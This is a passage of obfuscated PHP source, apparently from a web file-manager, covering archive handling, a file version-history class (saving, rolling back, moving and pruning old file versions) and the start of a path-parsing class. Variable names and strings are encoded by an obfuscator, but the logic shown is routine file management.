self::iconvSystem($éè½â›Âé‹¼); if ($‚ú÷àÓ£ğ >= 0) { $ş¡” = isset($òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[1126]]) ? $òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[1126]] : !1; $ñÙíÅÌÈÃ = isset($òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[28]]) ? $òş¡ö½æ³ãÉ[$†­¦°ëÑ²å€’[28]] : $†­¦°ëÑ²å€’[33]; KodArchive::filePreview($éè½â›Âé‹¼, $‚ú÷àÓ£ğ, $ş¡”, $ñÙíÅÌÈÃ); self::archiveExt(); die; } $³‚ß´äÙ„ = KodArchive::listContent($éè½â›Âé‹¼); self::archiveExt(); del_dir($ûäÓ›é¯±ë); if (!$³‚ß´äÙ„[$†­¦°ëÑ²å€’[1118]]) { show_json($³‚ß´äÙ„[$†­¦°ëÑ²å€’[1120]], !1); } $ÆÙŸó£¬È© = json_encode($³‚ß´äÙ„[$†­¦°ëÑ²å€’[1120]]); self::setContent($­ëÇ°øñŸ, $ÆÙŸó£¬È©); if (count($³‚ß´äÙ„[$†­¦°ëÑ²å€’[1120]]) >= $ò­¼®íè) { show_json(sprintf(LNG($†­¦°ëÑ²å€’[1124]), count($³‚ß´äÙ„[$†­¦°ëÑ²å€’[1120]])), !1); } return $³‚ß´äÙ„[$†­¦°ëÑ²å€’[1120]]; } private static function fileExt($Òø¾‡) { $ÙªÊ¼ïô”ââÖ =& $_SERVER[ÀÆ]; $˜Şø = $Òø¾‡[$ÙªÊ¼ïô”ââÖ[168]]; if ($˜Şø == $ÙªÊ¼ïô”ââÖ[1127]) { $—± = $ÙªÊ¼ïô”ââÖ[1128]; if (substr($Òø¾‡[$ÙªÊ¼ïô”ââÖ[28]], -strlen($—±)) == $—±) { $˜Şø = $ÙªÊ¼ïô”ââÖ[1129]; } } self::archiveExt($˜Şø); return $˜Şø; } private static function zipFileList($ ıİÓŸ, $®¦Ê’¢ = false) { $êÒú‹Êı‚ =& $_SERVER[ÀÆ]; $Ç¨ò¨Á± = array(); foreach ($ ıİÓŸ as $«ƒ·—´²Şíµ) { $£ÕøŒ = $«ƒ·—´²Şíµ[$êÒú‹Êı‚[76]]; if ($®¦Ê’¢) { $£ÕøŒ = self::copy($«ƒ·—´²Şíµ[$êÒú‹Êı‚[76]], $®¦Ê’¢, $êÒú‹Êı‚[810]); } else { $²·àÃ•¢¹¤Á = self::init($«ƒ·—´²Şíµ[$êÒú‹Êı‚[76]]); if ($²·àÃ•¢¹¤Á->getType() == $êÒú‹Êı‚[106]) { $£ÕøŒ = $²·àÃ•¢¹¤Á->path; } } if ($£ÕøŒ && self::local()->exist($£ÕøŒ)) { $Ç¨ò¨Á±[$«ƒ·—´²Şíµ[$êÒú‹Êı‚[76]]] = $£ÕøŒ; } } if (!empty($Ç¨ò¨Á±)) { return array_values($Ç¨ò¨Á±); } show_json(LNG($êÒú‹Êı‚[1093]), !1); } public static function tmpFileName($‘È­ÕÑÓ¢Ú) { $ö¨Áš­ê =& $_SERVER[ÀÆ]; $ê¸€ô¸Í¦éÚ = array($‘È­ÕÑÓ¢Ú[$ö¨Áš­ê[28]], $‘È­ÕÑÓ¢Ú[$ö¨Áš­ê[76]], $‘È­ÕÑÓ¢Ú[$ö¨Áš­ê[78]], $‘È­ÕÑÓ¢Ú[$ö¨Áš­ê[515]]); return md5(implode($ö¨Áš­ê[71], $ê¸€ô¸Í¦éÚ)); } private static function localFilePath($†æÚßº , $ÏşÎèà) { $™º–éà¦®Ë±¼ =& $_SERVER[ÀÆ]; if ($ÏşÎèà == $™º–éà¦®Ë±¼[1130] && strtoupper(substr(PHP_OS, 0, 3)) == $™º–éà¦®Ë±¼[1131]) { return !1; } $ì†•ÓÊ¬²¸ = KodIO::parse($†æÚßº ); if ($ì†•ÓÊ¬²¸[$™º–éà¦®Ë±¼[29]] == KodIO::KOD_SOURCE) { $ğã‡·ÒÑ = Model($™º–éà¦®Ë±¼[817])->fileInfoGet(KodIO::sourceID($†æÚßº )); if (!$ğã‡·ÒÑ[$™º–éà¦®Ë±¼[76]]) { show_json($™º–éà¦®Ë±¼[1132], !1); } $†æÚßº  = $ğã‡·ÒÑ[$™º–éà¦®Ë±¼[76]]; } $ˆ€³¥£ã = self::init($†æÚßº ); if ($ˆ€³¥£ã->pathParse[$™º–éà¦®Ë±¼[1080]]) { $†æÚßº  = $ˆ€³¥£ã->pathParse[$™º–éà¦®Ë±¼[1080]]; $ˆ€³¥£ã = self::init($†æÚßº ); } $Ø›Ğ = $ˆ€³¥£ã->getType(); if ($Ø›Ğ == $™º–éà¦®Ë±¼[106] || $Ø›Ğ == $™º–éà¦®Ë±¼[1133]) { if (!$ˆ€³¥£ã->exist($ˆ€³¥£ã->path)) { show_json(LNG($™º–éà¦®Ë±¼[105]), !1); } return $ˆ€³¥£ã->path; } return !1; } private static function archiveExt($»¿àêœêÇ¥“ª = '') { $GLOBALS[$_SERVER[ÀÆ][1134]] = $»¿àêœêÇ¥“ª; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $‰Ö Å‚ø†” =& $_SERVER[ÀÆ]; $ò°·şª¿Ñ·âõ = $GLOBALS[$‰Ö Å‚ø†”[6]][$‰Ö Å‚ø†”[88]]; if ($ò°·şª¿Ñ·âõ[$‰Ö Å‚ø†”[1135]] != 1) { return; } if ($ò°·şª¿Ñ·âõ[$‰Ö Å‚ø†”[1136]] <= 0) { return; } if (isset($_REQUEST[$‰Ö Å‚ø†”[1137]]) && $_REQUEST[$‰Ö Å‚ø†”[1137]] == $‰Ö Å‚ø†”[87]) { return; } Hook::bind($‰Ö Å‚ø†”[1138], $‰Ö Å‚ø†”[1139]); Hook::bind($‰Ö Å‚ø†”[1140], $‰Ö Å‚ø†”[1141]); Hook::bind($‰Ö Å‚ø†”[1142], $‰Ö Å‚ø†”[1143]); Hook::bind($‰Ö Å‚ø†”[1144], $‰Ö Å‚ø†”[1145]); Hook::bind($‰Ö Å‚ø†”[1146], $‰Ö Å‚ø†”[1147]); Hook::bind($‰Ö Å‚ø†”[1148], $‰Ö Å‚ø†”[1149]); } public static function eventBeforeUpload($œàŒŞÎĞŠ) { if ($œàŒŞÎĞŠ[3] && $œàŒŞÎĞŠ[3] != REPEAT_REPLACE) { return; } $å¡ÁıÕšû„™ = self::parsePath($œàŒŞÎĞŠ[0]); if (!$å¡ÁıÕšû„™) { return; } self::add($å¡ÁıÕšû„™); } public static function eventBeforeEdit($õ¡‘çŒù) { $ÃĞ“Ôû”ºÅ = self::parsePath($õ¡‘çŒù[0]); if (!$ÃĞ“Ôû”ºÅ) { return; } self::add($ÃĞ“Ôû”ºÅ); } public static function eventBeforeCopyFile($—÷, $Äƒ, $Š¼”ÉÙµÁ, $§Í…, $èĞ, $æ±Œ±Î) { $â«»ÅÎ¶ÆÉ” = $Š¼”ÉÙµÁ->getPathOuter($§Í…); $Ğù¼³®ä = self::parsePath($â«»ÅÎ¶ÆÉ”); if (!$Ğù¼³®ä) { return; } self::add($Ğù¼³®ä); } public static function eventBeforeRename($ìË÷¯À²¸ù) { $¢Ù =& $_SERVER[ÀÆ]; $•óÀ •ÕÃ = self::parsePath($ìË÷¯À²¸ù[0]); if (!$•óÀ •ÕÃ) { return; } $ØØ÷µßÀá·Ó = self::checkInHistory($•óÀ •ÕÃ); if (!$ØØ÷µßÀá·Ó) { return; } if ($ØØ÷µßÀá·Ó[$¢Ù[29]] == $¢Ù[193]) { $“©¯ÍèºÙùß = self::listData($•óÀ •ÕÃ); if ($“©¯ÍèºÙùß && $“©¯ÍèºÙùß[$¢Ù[367]]) { self::moveHistory($•óÀ •ÕÃ, $ìË÷¯À²¸ù[1]); } } else { IO::rename($ØØ÷µßÀá·Ó[$¢Ù[76]], $ìË÷¯À²¸ù[1]); } } public static function eventBeforeMove($§Õá) { $™Ùû­Ú”íı =& $_SERVER[ÀÆ]; $ÈàÆÕ”ºÅš = self::parsePath($§Õá[0]); if (!$ÈàÆÕ”ºÅš) { return; } $ÓÅ = self::parsePath($§Õá[1]); if (!$ÓÅ) { return; } $¦ÉÀ™”ì« = $§Õá[3]; $–™ûºŒ = self::checkInHistory($ÈàÆÕ”ºÅš); if (!$–™ûºŒ) { return; } $ÒÏ´ôö¿ = self::pathHistory($ÓÅ); if ($–™ûºŒ[$™Ùû­Ú”íı[29]] == $™Ùû­Ú”íı[193]) { $ÎñĞÇ«° = self::listData($ÈàÆÕ”ºÅš); $’çÅúüêğ = rtrim($ÓÅ, $™Ùû­Ú”íı[8]) . $™Ùû­Ú”íı[8] . ($¦ÉÀ™”ì« ? $¦ÉÀ™”ì« : get_path_this($ÈàÆÕ”ºÅš)); $ì‡ŠÛì¸İ = self::listData($’çÅúüêğ); if ($ÎñĞÇ«° && $ÎñĞÇ«°[$™Ùû­Ú”íı[367]] && $ì‡ŠÛì¸İ && $ì‡ŠÛì¸İ[$™Ùû­Ú”íı[367]]) { return self::clear($ÈàÆÕ”ºÅš); } if ($ÎñĞÇ«° && $ÎñĞÇ«°[$™Ùû­Ú”íı[367]]) { self::moveHistory($ÈàÆÕ”ºÅš, $¦ÉÀ™”ì«, $ÒÏ´ôö¿); } } else { IO::move($–™ûºŒ[$™Ùû­Ú”íı[76]], $ÒÏ´ôö¿, !1, $¦ÉÀ™”ì«); self::clearEmptyFolder(IO::pathFather($–™ûºŒ[$™Ùû­Ú”íı[76]])); } } public static function eventAfterRemove($š¨çõ, $¶©±©¢Ç±•€) { $¢ÓŸàç¦ =& $_SERVER[ÀÆ]; if (!$¶©±©¢Ç±•€) { return; } $É² = self::parsePath($š¨çõ[0]); if (!$É²) { return; } $ÍÛğ˜˜ƒ» = self::checkInHistory($É²); if (!$ÍÛğ˜˜ƒ») { return; } if ($ÍÛğ˜˜ƒ»[$¢ÓŸàç¦[29]] == $¢ÓŸàç¦[193]) { $ù„ = self::listData($É², !1); if ($ù„ && $ù„[$¢ÓŸàç¦[367]]) { self::clear($É², !1); } } else { IO::remove($ÍÛğ˜˜ƒ»[$¢ÓŸàç¦[76]]); self::clearEmptyFolder(IO::pathFather($ÍÛğ˜˜ƒ»[$¢ÓŸàç¦[76]])); } } private static function checkInHistory($àÒÉÔŒÇ) { $Î»¦é¿’†“¤¼ = self::pathHistory($àÒÉÔŒÇ); if (!IO::exist($Î»¦é¿’†“¤¼)) { $Î»¦é¿’†“¤¼ .= $_SERVER[ÀÆ][1150]; } return IO::exist($Î»¦é¿’†“¤¼) ? IO::info($Î»¦é¿’†“¤¼) : !1; } private static function parsePath($—ğÊé·…Õ½) { $·¶õ¹ˆÉ =& $_SERVER[ÀÆ]; if (!$—ğÊé·…Õ½) { return !1; } if ($GLOBALS[$·¶õ¹ˆÉ[1151]]) { return; } $ÉİÍÃªÜ¬ = KodIO::parse($—ğÊé·…Õ½); $Î¢® = $ÉİÍÃªÜ¬[$·¶õ¹ˆÉ[29]]; $â›ä„í¸·à = !$Î¢® || $Î¢® == KodIO::KOD_IO || $Î¢® == KodIO::KOD_SHARE_ITEM; if (!$â›ä„í¸·à || !$ÉİÍÃªÜ¬[$·¶õ¹ˆÉ[1152]]) { return !1; } if (substr($—ğÊé·…Õ½, 0, strlen(DATA_PATH . $·¶õ¹ˆÉ[1153])) == DATA_PATH . $·¶õ¹ˆÉ[1153]) { return !1; } if ($Î¢® == KodIO::KOD_SHARE_ITEM) { $ Æú“ = IO::init($—ğÊé·…Õ½); if ($ Æú“->pathParse[$·¶õ¹ˆÉ[1080]]) { return self::parsePath($ Æú“->pathParse[$·¶õ¹ˆÉ[1080]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $àÏæÍÕ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $·¶õ¹ˆÉ[1154]); foreach ($àÏæÍÕ as $á—ÆÌƒëÎ) { if (!$Î¢® && substr($—ğÊé·…Õ½, 0, strlen($á—ÆÌƒëÎ)) == $á—ÆÌƒëÎ) { return !1; } } self::log($GLOBALS[$·¶õ¹ˆÉ[1075]] . $·¶õ¹ˆÉ[1155] . $—ğÊé·…Õ½); return $—ğÊé·…Õ½; } private static function pathHistory($ïÈšòÖáš‡Ê) { $ÈÕÍöû²´§Öó =& $_SERVER[ÀÆ]; $·Ü = self::$_historyBase . ltrim(KodIO::clear($ïÈšòÖáš‡Ê), $ÈÕÍöû²´§Öó[8]); $·Ü = str_replace(array($ÈÕÍöû²´§Öó[1156]), array($ÈÕÍöû²´§Öó[1157]), $·Ü); return $·Ü; } public static function log($šî¡ÆÛ˜) { } public static function historyCount($Ïé¶ô¢Ô) { $€áå =& $_SERVER[ÀÆ]; $Ú™ĞÈ®”ç¶ = array(); $ûä = array(); foreach ($Ïé¶ô¢Ô as $æ¯ö¼å) { $®É = get_path_father($æ¯ö¼å); if (!$ûä[$®É]) { $ûä[$®É] = array(); } $ûä[$®É][] = get_path_this($æ¯ö¼å); } foreach ($ûä as $®É => $«îî–°) { $ƒ• = self::parsePath($®É); if (!$ƒ•) { continue; } foreach ($«îî–° as $¬îĞÚ‰ì) { $šŠ¤” = self::listData(rtrim($ƒ•, $€áå[8]) . $€áå[8] . $¬îĞÚ‰ì, !1); if ($šŠ¤” && $šŠ¤”[$€áå[367]]) { $Ú™ĞÈ®”ç¶[rtrim($®É, $€áå[8]) . $€áå[8] . $¬îĞÚ‰ì] = count($šŠ¤”[$€áå[367]]); } } } return $Ú™ĞÈ®”ç¶; } public static function add($œÉ‘®À‰á½Â) { $…·­—–ˆ =& $_SERVER[ÀÆ]; $´Ä¼ãø = self::listData($œÉ‘®À‰á½Â); if (!$´Ä¼ãø) { return; } $ÔÃ½±ŠÊé = Model($…·­—–ˆ[755])->get($…·­—–ˆ[1158]); $È×èØÜÍ¨Ó = $GLOBALS[$…·­—–ˆ[6]][$…·­—–ˆ[88]][$…·­—–ˆ[1136]]; $—è = $ÔÃ½±ŠÊé == $…·­—–ˆ[1159] ? 5 : $È×èØÜÍ¨Ó; if ($È×èØÜÍ¨Ó <= 0) { return; } $¸œ–¸ğ = IO::hashSimple($œÉ‘®À‰á½Â); $­å°ª„–ıˆ = IO::info($œÉ‘®À‰á½Â); $ÈÁô¿§× = $´Ä¼ãø[$…·­—–ˆ[367]]; if ($­å°ª„–ıˆ[$…·­—–ˆ[78]] == 0) { return; } if ($­å°ª„–ıˆ[$…·­—–ˆ[78]] >= 1024 * 1024 * 500) { return !1; } if ($ÈÁô¿§× && $ÈÁô¿§×[0][$…·­—–ˆ[171]] == $¸œ–¸ğ) { return !0; } if (array_key_exists($…·­—–ˆ[196], $­å°ª„–ıˆ) && !$­å°ª„–ıˆ[$…·­—–ˆ[196]]) { return !1; } $„¸ = short_id(time()); $º¡ = array($…·­—–ˆ[395] => $„¸, $…·­—–ˆ[171] => $¸œ–¸ğ, $…·­—–ˆ[28] => $­å°ª„–ıˆ[$…·­—–ˆ[28]] . $…·­—–ˆ[95] . date($…·­—–ˆ[1160]) . rand_string(1), $…·­—–ˆ[78] => $­å°ª„–ıˆ[$…·­—–ˆ[78]], $…·­—–ˆ[446] => USER_ID, $…·­—–ˆ[194] => time(), $…·­—–ˆ[1161] => $…·­—–ˆ[33]); IO::mkdir($´Ä¼ãø[$…·­—–ˆ[1162]]); $Ñ² = IO::copy($œÉ‘®À‰á½Â, $´Ä¼ãø[$…·­—–ˆ[1162]], !1, $º¡[$…·­—–ˆ[28]]); if (!$Ñ²) { self::clearEmptyFolder($´Ä¼ãø[$…·­—–ˆ[1162]]); return !1; } array_unshift($ÈÁô¿§×, $º¡); if (count($ÈÁô¿§×) > $—è) { $ØÌ™ç­¨õËº = array_slice($ÈÁô¿§×, $—è); foreach ($ØÌ™ç­¨õËº as $Øª¿î) { IO::remove($´Ä¼ãø[$…·­—–ˆ[1162]] . $Øª¿î[$…·­—–ˆ[28]]); } $ÈÁô¿§× = array_slice($ÈÁô¿§×, 0, $—è); } return self::saveData($´Ä¼ãø[$…·­—–ˆ[1163]], $ÈÁô¿§×); } public static function remove($©øÓÜãÇ¶Ï, $Š ) { $»¡«Æ¤ÈÒ¬ =& $_SERVER[ÀÆ]; $—Ò±ì…¬¢¥ = self::listData($©øÓÜãÇ¶Ï); $«— = array(); if (!$—Ò±ì…¬¢¥) { return !1; } foreach ($—Ò±ì…¬¢¥[$»¡«Æ¤ÈÒ¬[367]] as $Áã»­°) { if ($Áã»­°[$»¡«Æ¤ÈÒ¬[395]] == $Š ) { IO::remove($—Ò±ì…¬¢¥[$»¡«Æ¤ÈÒ¬[1162]] . $Áã»­°[$»¡«Æ¤ÈÒ¬[28]]); continue; } $«—[] = $Áã»­°; } return self::saveData($—Ò±ì…¬¢¥[$»¡«Æ¤ÈÒ¬[1163]], $«—); } public static function clear($‹¶¸ŒˆÕ, $¸Å¡¶¡› = true) { $ú± =& $_SERVER[ÀÆ]; $Ÿù£©óõ = self::listData($‹¶¸ŒˆÕ, $¸Å¡¶¡›); if (!$Ÿù£©óõ) { return !1; } foreach ($Ÿù£©óõ[$ú±[367]] as $´Œæüã£»Œ§) { IO::remove($Ÿù£©óõ[$ú±[1162]] . $´Œæüã£»Œ§[$ú±[28]]); } return self::saveData($Ÿù£©óõ[$ú±[1163]], array()); } public static function moveHistory($¼—ò¢ä™šå”æ, $‡—Æ = '', $˜ä‚‡›± = '') { $¶Ù =& $_SERVER[ÀÆ]; $ñÑ¹á¡À = self::listData($¼—ò¢ä™šå”æ, !1); if (!$ñÑ¹á¡À || !$ñÑ¹á¡À[$¶Ù[367]]) { return !1; } $¬˜ßÍìù = $¶Ù[1150]; $‡—Æ = $‡—Æ ? $‡—Æ : get_path_this($¼—ò¢ä™šå”æ); $˜ä‚‡›± = $˜ä‚‡›± ? $˜ä‚‡›± : $ñÑ¹á¡À[$¶Ù[1162]]; $‘ê‰ıúø€ÔóÕ = substr(get_path_this($ñÑ¹á¡À[$¶Ù[1163]]), 0, -strlen($¬˜ßÍìù)); foreach ($ñÑ¹á¡À[$¶Ù[367]] as $âä¦ => $ğ•‘½Ü÷¾) { $ÜùÏ = $‡—Æ . substr($ğ•‘½Ü÷¾[$¶Ù[28]], strlen($‘ê‰ıúø€ÔóÕ)); $”øúë = IO::move($ñÑ¹á¡À[$¶Ù[1162]] . $ğ•‘½Ü÷¾[$¶Ù[28]], $˜ä‚‡›±, !1, $ÜùÏ); if ($”øúë) { $ñÑ¹á¡À[$¶Ù[367]][$âä¦][$¶Ù[28]] = $ÜùÏ; } } $ñÑ¹á¡À[$¶Ù[1163]] = IO::move($ñÑ¹á¡À[$¶Ù[1163]], $˜ä‚‡›±, !1, $‡—Æ . $¬˜ßÍìù); self::saveData($ñÑ¹á¡À[$¶Ù[1163]], $ñÑ¹á¡À[$¶Ù[367]]); self::clearEmptyFolder($ñÑ¹á¡À[$¶Ù[1162]]); } public static function rollback($úî‚, $”â) { $ÓùÖéıáØ =& $_SERVER[ÀÆ]; $È¿¨ÍÜÔ˜Ö = self::listData($úî‚); if (!$È¿¨ÍÜÔ˜Ö) { return; } $™Şã²±È = IO::info($úî‚); foreach ($È¿¨ÍÜÔ˜Ö[$ÓùÖéıáØ[367]] as $€õÈ® => $ã²¸ˆ) { if ($ã²¸ˆ[$ÓùÖéıáØ[395]] == $”â) { self::add($úî‚); $™ó… = $È¿¨ÍÜÔ˜Ö[$ÓùÖéıáØ[1162]] . $ã²¸ˆ[$ÓùÖéıáØ[28]]; $¼ùê = IO::copy($™ó…, IO::pathFather($úî‚), REPEAT_REPLACE, $™Şã²±È[$ÓùÖéıáØ[28]]); if ($¼ùê) { self::remove($úî‚, $”â); } return $¼ùê; } } return !1; } public static function setDetail($ÛÓ™‰, $Óë½, $ÄÔÌèõÙÓ®) { $‡µ©áÓ÷ì =& $_SERVER[ÀÆ]; $æ‡ = self::listData($ÛÓ™‰); if (!$æ‡) { return; } foreach ($æ‡[$‡µ©áÓ÷ì[367]] as $¾¤ãàˆÏÉ‹§ => $Î†¼Ê¶¡¶ğü) { if ($Î†¼Ê¶¡¶ğü[$‡µ©áÓ÷ì[395]] == $Óë½) { $æ‡[$‡µ©áÓ÷ì[367]][$¾¤ãàˆÏÉ‹§][$‡µ©áÓ÷ì[1161]] = $ÄÔÌèõÙÓ®; self::saveData($æ‡[$‡µ©áÓ÷ì[1163]], $æ‡[$‡µ©áÓ÷ì[367]]); return !0; } } return !1; } public static function fileInfo($õ™Ë¾, $Ç…»Ã®Ä) { $ÈÌÒµû =& $_SERVER[ÀÆ]; $óøÈƒ«Ì = self::listData($õ™Ë¾); if (!$óøÈƒ«Ì) { show_json(LNG($ÈÌÒµû[105]), !1); } $ÖË‡Á = $ÈÌÒµû[33]; foreach ($óøÈƒ«Ì[$ÈÌÒµû[367]] as $şäĞÓØ => $Àºèä§Ğ) { if ($Àºèä§Ğ[$ÈÌÒµû[395]] != $Ç…»Ã®Ä) { continue; } $ÖË‡Á = $óøÈƒ«Ì[$ÈÌÒµû[1162]] . $Àºèä§Ğ[$ÈÌÒµû[28]]; break; } if (!$ÖË‡Á) { show_json(LNG($ÈÌÒµû[105]), !1); } return IO::info($ÖË‡Á); } public static function fileOut($¿Ø, $Ñ¨µ‘ËÄºÊ‡, $ÍÌšâõ¬ = false) { $®ñÑÚ =& $_SERVER[ÀÆ]; $ô• = self::fileInfo($¿Ø, $Ñ¨µ‘ËÄºÊ‡); $£ÈÙß’ö€ =& $GLOBALS[$®ñÑÚ[7]]; $ÍÌšâõ¬ = isset($£ÈÙß’ö€[$®ñÑÚ[1126]]) && $£ÈÙß’ö€[$®ñÑÚ[1126]] == 1; if (isset($£ÈÙß’ö€[$®ñÑÚ[29]]) && $£ÈÙß’ö€[$®ñÑÚ[29]] == $®ñÑÚ[1164]) { return IO::fileOutImage($ô•[$®ñÑÚ[76]], $£ÈÙß’ö€[$®ñÑÚ[1165]]); } IO::fileOut($ô•[$®ñÑÚ[76]], $ÍÌšâõ¬, get_path_this($¿Ø)); } public static function listData($Ò±á, $’ÊĞûæÚô = true) { $Á¬§°òº¿È =& $_SERVER[ÀÆ]; if ($’ÊĞûæÚô && !IO::exist($Ò±á)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ò±á, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $à¨ŞÁÔ“¸ = self::pathHistory($Ò±á); $áõ²±­éµÌ‚ = array($Á¬§°òº¿È[1163] => $à¨ŞÁÔ“¸ . $Á¬§°òº¿È[1150], $Á¬§°òº¿È[1162] => rtrim(get_path_father($à¨ŞÁÔ“¸), $Á¬§°òº¿È[8]) . $Á¬§°òº¿È[8], $Á¬§°òº¿È[367] => array()); $®·åÂÀùåó‚ = IO::getContent($áõ²±­éµÌ‚[$Á¬§°òº¿È[1163]]); if ($®·åÂÀùåó‚) { $ÇêÚÁ = json_decode($®·åÂÀùåó‚, !0); if (is_array($ÇêÚÁ)) { $áõ²±­éµÌ‚[$Á¬§°òº¿È[367]] = $ÇêÚÁ; } } return $áõ²±­éµÌ‚; } private static function saveData($ŞãÊÚ¤, $Á£êĞ†ã¬ÕÁ) { $şİ·¼‡Ûô¯ò =& $_SERVER[ÀÆ]; self::log($şİ·¼‡Ûô¯ò[1166] . $ŞãÊÚ¤ . $şİ·¼‡Ûô¯ò[68] . count($Á£êĞ†ã¬ÕÁ), $şİ·¼‡Ûô¯ò[737]); if ($Á£êĞ†ã¬ÕÁ) { return IO::setContent($ŞãÊÚ¤, json_encode($Á£êĞ†ã¬ÕÁ)); } $‹á“³Ä = IO::pathFather($ŞãÊÚ¤); IO::remove($ŞãÊÚ¤); self::clearEmptyFolder($‹á“³Ä); return !0; } public static function clearEmptyFolder($êÏäôËË ˆŸ) { $ïƒ„€Ñ¦ =& $_SERVER[ÀÆ]; if (trim($êÏäôËË ˆŸ, $ïƒ„€Ñ¦[8]) == trim(self::$_historyBase, $ïƒ„€Ñ¦[8])) { return; } $â¹°Ù¢úİ‚ = IO::pathFather($êÏäôËË ˆŸ); $€¤ôŠÍå = IO::has($êÏäôËË ˆŸ, !0); if ($€¤ôŠÍå[$ïƒ„€Ñ¦[203]] > 0 || $€¤ôŠÍå[$ïƒ„€Ñ¦[204]] > 0) { return; } IO::remove($êÏäôËË ˆŸ); self::clearEmptyFolder($â¹°Ù¢úİ‚); } private static function getBasePath() { $Ë´ë‹À£˜Œ =& $_SERVER[ÀÆ]; $¸şÚçÎ˜Æíµ = Model($Ë´ë‹À£˜Œ[1167])->get($Ë´ë‹À£˜Œ[1168]); if ($¸şÚçÎ˜Æíµ) { if (!IO::exist($¸şÚçÎ˜Æíµ)) { IO::mkdir($¸şÚçÎ˜Æíµ); } if (get_path_this($¸şÚçÎ˜Æíµ) == $Ë´ë‹À£˜Œ[1153]) { $¢ı¸Ëúæ = $Ë´ë‹À£˜Œ[1169] . rand_string(8); @rename($¸şÚçÎ˜Æíµ, get_path_father($¸şÚçÎ˜Æíµ) . $Ë´ë‹À£˜Œ[8] . $¢ı¸Ëúæ); $¸şÚçÎ˜Æíµ = DATA_PATH . $¢ı¸Ëúæ . $Ë´ë‹À£˜Œ[8]; file_put_contents(DATA_PATH . $Ë´ë‹À£˜Œ[1170], $Ë´ë‹À£˜Œ[33]); Model($Ë´ë‹À£˜Œ[1167])->set($Ë´ë‹À£˜Œ[1168], $¸şÚçÎ˜Æíµ); } return $¸şÚçÎ˜Æíµ; } $¸şÚçÎ˜Æíµ = DATA_PATH . $Ë´ë‹À£˜Œ[1169] . rand_string(8) . $Ë´ë‹À£˜Œ[8]; $¸şÚçÎ˜Æíµ = IO::mkdir($¸şÚçÎ˜Æíµ); $¸şÚçÎ˜Æíµ = rtrim($¸şÚçÎ˜Æíµ, $Ë´ë‹À£˜Œ[8]) . $Ë´ë‹À£˜Œ[8]; file_put_contents($¸şÚçÎ˜Æíµ . $Ë´ë‹À£˜Œ[1170], $Ë´ë‹À£˜Œ[33]); file_put_contents(DATA_PATH . $Ë´ë‹À£˜Œ[1170], $Ë´ë‹À£˜Œ[33]); Model($Ë´ë‹À£˜Œ[1167])->set($Ë´ë‹À£˜Œ[1168], $¸şÚçÎ˜Æíµ); return $¸şÚçÎ˜Æíµ; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\145\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\145\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\106\x69\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\151\154\145\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\122\157\157\x74\123\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\123\150\x61\162\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\145\111\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\x65\111\164\145\x6d\x4c\x69\156\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\x72\143\150\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\122\x65\156\143\145\156\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\x72\x7d"; public static function typeList() { $³«õÀ¡İ =& $_SERVER[ÀÆ]; return array($³«õÀ¡İ[1171] => self::KOD_SOURCE, $³«õÀ¡İ[1172] => self::KOD_USER_RECYCLE, $³«õÀ¡İ[1173] => self::KOD_USER_FAV, $³«õÀ¡İ[1174] => self::KOD_USER_FILE_TAG, $³«õÀ¡İ[1175] => self::KOD_USER_FILE_TYPE, $³«õÀ¡İ[1176] => self::KOD_GROUP_ROOT_SELF, $³«õÀ¡İ[1177] => self::KOD_USER_SHARE, $³«õÀ¡İ[1178] => self::KOD_USER_SHARE_LINK, $³«õÀ¡İ[1179] => self::KOD_USER_SHARE_TO_ME, $³«õÀ¡İ[1180] => self::KOD_SHARE_ITEM, $³«õÀ¡İ[1181] => self::KOD_SHARE_LINK, $³«õÀ¡İ[1182] => self::KOD_SEARCH, $³«õÀ¡İ[1183] => self::KOD_BLOCK, $³«õÀ¡İ[1184] => self::KOD_IO, $³«õÀ¡İ[1185] => self::KOD_USER_RECENT, $³«õÀ¡İ[1186] => self::KOD_USER_DRIVER); } public static function parse($¸Ğ) { $ÓÍ«‡Ëè³ô =& $_SERVER[ÀÆ]; $¸Ğ = self::clear($¸Ğ); $Šö–ôÂˆ÷è = array_values(self::typeList()); preg_match($ÓÍ«‡Ëè³ô[1187], $¸Ğ, $Š•ª±); $ã¾÷Èşø“ = array($ÓÍ«‡Ëè³ô[417] => !1, $ÓÍ«‡Ëè³ô[1188] => !1, $ÓÍ«‡Ëè³ô[414] => !1, $ÓÍ«‡Ëè³ô[76] => $¸Ğ, $ÓÍ«‡Ëè³ô[1097] => !1, $ÓÍ«‡Ëè³ô[1096] => $ÓÍ«‡Ëè³ô[33]); if (is_array($Š•ª±) && count($Š•ª±) == 5) { $¥³± = $ÓÍ«‡Ëè³ô[1189] . $Š•ª±[2] . $ÓÍ«‡Ëè³ô[325]; if (in_array($¥³±, $Šö–ôÂˆ÷è)) { $ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[1097]] = $Š•ª±[1]; 